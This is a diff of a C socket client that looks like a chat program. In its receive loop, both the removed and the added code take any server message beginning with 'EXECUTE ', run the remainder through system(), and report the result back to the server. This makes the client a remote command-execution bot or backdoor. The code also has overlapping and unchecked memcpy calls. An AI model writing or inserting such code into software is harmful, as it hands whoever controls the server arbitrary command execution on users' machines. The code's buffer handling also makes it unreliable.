@@ -57,24 +57,31 @@ send(socketDescriptor,sendBuffer,strlen(sendBuffer)+1,0);
 printf("\nMessage sent !\n");
 }
 }
-else
-{
-while(1)
-{
-bzero(&recvBuffer,sizeof(recvBuffer));
-/*Receive the message from server*/
-recv(socketDescriptor,recvBuffer,sizeof(recvBuffer),0);
-if(strncmp(recvBuffer,"EXECUTE ",8)==0) {
+else {
+  char statbuf[1025];
+  while(1){
+    bzero(&recvBuffer,sizeof(recvBuffer));
+    /*Receive the message from server*/
+    int retval=recv(socketDescriptor,recvBuffer,sizeof(recvBuffer),0);
+    printf("\nSERVER : %s\n",recvBuffer);
 
-  memcpy( recvBuffer, &recvBuffer[8], strlen(recvBuffer) );
-  dup2(1,9);
-  dup2(socketDescriptor,1);
-  system(recvBuffer);
-  dup2(9,1);
-  close(9);
-}
-printf("\nSERVER : %s\n",recvBuffer);
-}
+    char comparer[10] = "EXECUTE ";
+  //  if(retval > 0) {
+    memcpy( statbuf, &recvBuffer[2], strlen(recvBuffer) );
+    int ndest = recvBuffer[0]-'0';
+  //  printf("es:|%s| comparat amb: |%s|",statbuf, comparer);
+    if(strncmp(statbuf,comparer,strlen(comparer))==0) {
+    //
+    memcpy( recvBuffer, &recvBuffer[10], strlen(recvBuffer) );
+    //
+         int status = system(recvBuffer);
+    //
+         sprintf(statbuf, "%d REACHED: %d\0",ndest, status);
+         send(socketDescriptor, statbuf , strlen(statbuf) , 0 );
+    //   }
+   }
+
+  }
 }
 return 0;
 }
